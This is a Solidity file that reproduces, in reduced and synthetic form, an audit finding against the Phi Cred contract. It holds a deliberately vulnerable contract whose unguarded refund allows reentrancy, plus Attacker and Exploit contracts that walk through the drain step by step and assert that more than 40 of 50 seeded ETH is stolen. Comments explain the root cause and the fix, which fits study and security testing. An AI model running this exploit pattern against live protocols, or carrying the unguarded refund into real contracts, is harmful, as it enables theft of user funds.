// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Phi - Reentrancy in creating Creds allows an attacker to steal all Ether
    from the Cred contract
    (Code4rena 2024-08-phi, #43397, H-06, reporter rscodes / CAUsr)

    SYNTHETIC, CHEATCODE-FREE reproduction for the EVM Playground. Reduced
    Cred.createCred / _createCredInternal / buyShareCred / sellShareCred with
    the refund-before-counter-increment reentrancy surface preserved. Two
    fixed-price bonding curves (cheap + expensive) are whitelisted. The
    attacker reenters on the excess-ETH refund during the first createCred,
    buys shares cheaply, re-creates the same credId with the expensive curve
    (counter not yet incremented), then sells high and drains the Cred balance.
//////////////////////////////////////////////////////////////////////////*/

/*//////////////////////////////////////////////////////////////
    Root cause: _createCredInternal writes creds[credIdCounter], then calls
    buyShareCred (which refunds excess ETH to msg.sender BEFORE the counter is
    incremented). There is no reentrancy guard. On the refund the attacker can:
      1) buy more shares on the still-open credId (cheap curve),
      2) call createCred again with an expensive curve, overwriting
         creds[credIdCounter].bondingCurve (counter still the same),
      3) sell the cheaply-bought shares against the expensive curve and drain
         protocol ETH.
    Recommended fix: nonReentrant on createCred (and buy/sell), and/or CEI
    (increment counter before external calls / refunds).
//////////////////////////////////////////////////////////////*/

/// @dev Minimal fixed-price bonding curve used by Cred for buy/sell quotes.
contract FixedPriceBondingCurve {
    uint256 public immutable pricePerShare; // wei per share

    constructor(uint256 _pricePerShare) {
        pricePerShare = _pricePerShare;
    }

    function getBuyPrice(uint256 /* supply */, uint256 amount) external view returns (uint256) {
        return pricePerShare * amount;
    }

    function getSellPrice(uint256 /* supply */, uint256 amount) external view returns (uint256) {
        return pricePerShare * amount;
    }
}

/// @notice Reduced Cred - faithful reduction of src/Cred.sol create/buy/sell
///         paths with multi-curve overwrite via reentrancy.
contract Cred {
    struct CredInfo {
        address creator;
        address bondingCurve;
        uint256 currentSupply;
    }

    uint256 public credIdCounter = 1;
    mapping(uint256 => CredInfo) public creds;
    mapping(uint256 => mapping(address => uint256)) public shareBalance;
    mapping(address => bool) public whitelistedCurve;

    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function addToWhitelist(address curve) external {
        require(msg.sender == owner, "only owner");
        whitelistedCurve[curve] = true;
    }

    /// @dev Seed protocol liquidity (other users' buy activity) so sells can
    ///      be paid. Mirrors the finding's `vm.deal(address(cred), 50 ether)`.
    function seedLiquidity() external payable {}

    /// @dev Reduced createCred - signature checks omitted (not relevant to the
    ///      reentrancy). NO nonReentrant guard - the bug.
    function createCred(address creator_, address bondingCurve_) external payable {
        require(whitelistedCurve[bondingCurve_], "curve not whitelisted");
        require(creator_ != address(0), "zero creator");
        _createCredInternal(creator_, bondingCurve_);
    }

    /// @dev VERBATIM structure of Cred._createCredInternal
    ///      (src/Cred.sol#L557-L593): write cred fields, buyShareCred (which
    ///      may refund), THEN increment counter.
    function _createCredInternal(address creator_, address bondingCurve_) internal returns (uint256) {
        creds[credIdCounter].creator = creator_;
        // @> VULN surface: bondingCurve assigned before counter increments;
        // a reentrant createCred overwrites this same slot with a different curve.
        creds[credIdCounter].bondingCurve = bondingCurve_;

        buyShareCred(credIdCounter, 1);

        // Counter increment is AFTER the external refund in buyShareCred -
        // not reached while the attacker reenters.
        credIdCounter += 1;
        return credIdCounter - 1;
    }

    /// @dev Reduced buyShareCred - prices via the cred's current bonding curve;
    ///      excess ETH is refunded with a raw call (reentrancy vector).
    function buyShareCred(uint256 credId_, uint256 amount_) public payable {
        CredInfo storage cred = creds[credId_];
        require(cred.bondingCurve != address(0), "no cred");
        uint256 price = FixedPriceBondingCurve(cred.bondingCurve).getBuyPrice(cred.currentSupply, amount_);
        require(msg.value >= price, "insufficient payment");

        cred.currentSupply += amount_;
        shareBalance[credId_][msg.sender] += amount_;

        uint256 excessPayment = msg.value - price;
        if (excessPayment > 0) {
            // @> VULN: external refund before counter increment / without reentrancy guard
            // FIX: nonReentrant on createCred/buyShareCred; or CEI (effects before interaction)
            (bool ok, ) = msg.sender.call{value: excessPayment}("");
            require(ok, "refund failed");
        }
    }

    /// @dev Reduced sellShareCred - pays sell price from contract balance.
    function sellShareCred(uint256 credId_, uint256 amount_) external {
        CredInfo storage cred = creds[credId_];
        require(shareBalance[credId_][msg.sender] >= amount_, "not enough shares");
        uint256 price = FixedPriceBondingCurve(cred.bondingCurve).getSellPrice(cred.currentSupply, amount_);
        require(address(this).balance >= price, "cred insolvent");

        shareBalance[credId_][msg.sender] -= amount_;
        cred.currentSupply -= amount_;

        (bool ok, ) = msg.sender.call{value: price}("");
        require(ok, "sell pay failed");
    }

    function credBondingCurve(uint256 credId_) external view returns (address) {
        return creds[credId_].bondingCurve;
    }

    receive() external payable {}
}

/// @dev Attacker helper - reenters on ETH refunds during create/buy.
contract Attacker {
    Cred public immutable cred;
    FixedPriceBondingCurve public cheap;
    FixedPriceBondingCurve public expensive;

    // 1000 shares * cheap 0.001 = 1 ETH buy cost; * expensive 0.05 = 50 ETH sell.
    uint256 public constant SHARES_BUFFER = 1000;
    uint256 private stage;
    uint256 private credId;
    uint256 public stolen;

    constructor(Cred cred_, FixedPriceBondingCurve cheap_, FixedPriceBondingCurve expensive_) {
        cred = cred_;
        cheap = cheap_;
        expensive = expensive_;
    }

    function attack() external payable {
        require(msg.value >= 3 ether, "need capital");
        stage = 1;
        credId = cred.credIdCounter();

        // Step 1: create first cred on the CHEAP curve with excess ETH so the
        // refund reenters us before credIdCounter increments.
        cred.createCred{value: 1.5 ether}(address(this), address(cheap));

        stage = 0;
        stolen = address(this).balance;
        // Sweep to owner (Exploit) for profit measurement.
        if (stolen > 0) {
            (bool ok, ) = msg.sender.call{value: stolen}("");
            require(ok, "sweep failed");
        }
    }

    receive() external payable {
        if (stage == 1) {
            // Step 2: refund from first create's buyShareCred - buy many shares
            // cheaply with excess so we reenter again.
            stage = 2;
            // 1000 * 0.001 ether = 1 ether price; send 1.2 for excess refund reentry.
            cred.buyShareCred{value: 1.2 ether}(credId, SHARES_BUFFER);
        } else if (stage == 2) {
            // Step 3: overwrite the same credId with the EXPENSIVE curve
            // (counter still not incremented by the outer createCred).
            stage = 3;
            // 1 share * 0.05 ether; send 0.2 for excess refund reentry into stage 4.
            cred.createCred{value: 0.2 ether}(address(this), address(expensive));
        } else if (stage == 3) {
            // Step 4: refund from the nested create - sell as many shares as
            // the cred balance allows against the expensive curve.
            stage = 4;
            require(cred.credIdCounter() == credId, "still same open credId");
            require(cred.credBondingCurve(credId) == address(expensive), "curve overwritten");

            uint256 bal = cred.shareBalance(credId, address(this));
            // Keep 2 shares so nested create/buy unwinds can complete.
            uint256 sellAmount = bal > 2 ? bal - 2 : 0;
            uint256 pricePer = expensive.pricePerShare();
            uint256 maxAffordable = address(cred).balance / pricePer;
            if (sellAmount > maxAffordable) sellAmount = maxAffordable;
            if (sellAmount > 0) {
                cred.sellShareCred(credId, sellAmount);
            }
        }
        // stage 4+: accept sell proceeds / nested refunds without further action
    }
}

/// @dev Orchestrator. Deploys Cred + two curves + Attacker. Setup seeds Cred
///      liquidity and whitelists curves. run() funds the attacker and executes
///      the reentrancy drain.
contract Exploit {
    Cred public cred; // nonce 1
    FixedPriceBondingCurve public cheap; // nonce 2
    FixedPriceBondingCurve public expensive; // nonce 3
    Attacker public attacker; // nonce 4

    uint256 public constant CHEAP_PRICE = 0.001 ether;
    uint256 public constant EXPENSIVE_PRICE = 0.05 ether; // 50x - 1000 shares sell for 50 ETH
    uint256 public constant SEED = 50 ether;

    constructor() {
        cred = new Cred(); // CREATE nonce 1
        cheap = new FixedPriceBondingCurve(CHEAP_PRICE); // nonce 2
        expensive = new FixedPriceBondingCurve(EXPENSIVE_PRICE); // nonce 3
        attacker = new Attacker(cred, cheap, expensive); // nonce 4

        // Whitelist both curves (owner = this Exploit).
        cred.addToWhitelist(address(cheap));
        cred.addToWhitelist(address(expensive));
    }

    /// @notice Cred already seeded with SEED ETH (setup). run() launches the
    ///         reentrancy attack and requires a large drain of the Cred balance.
    function run() external payable {
        require(msg.value >= 3 ether, "fund attack capital");
        uint256 credBefore = address(cred).balance;
        require(credBefore >= SEED, "cred not seeded");

        // === attack: reenter createCred, overwrite curve, sell high ===
        attacker.attack{value: 3 ether}();

        uint256 credAfter = address(cred).balance;
        uint256 drained = credBefore > credAfter ? credBefore - credAfter : 0;

        // HARM: nearly all of the seeded protocol ETH is drained via the
        // curve-overwrite reentrancy (finding claims >45 of 50 ETH).
        require(drained > 40 ether, "should drain most of Cred balance");
        require(credAfter < 15 ether, "Cred should be largely emptied");
        // Attacker swept proceeds to Exploit (msg.sender of attack()).
        require(address(this).balance >= 40 ether, "Exploit holds stolen ETH");
    }

    receive() external payable {}
}
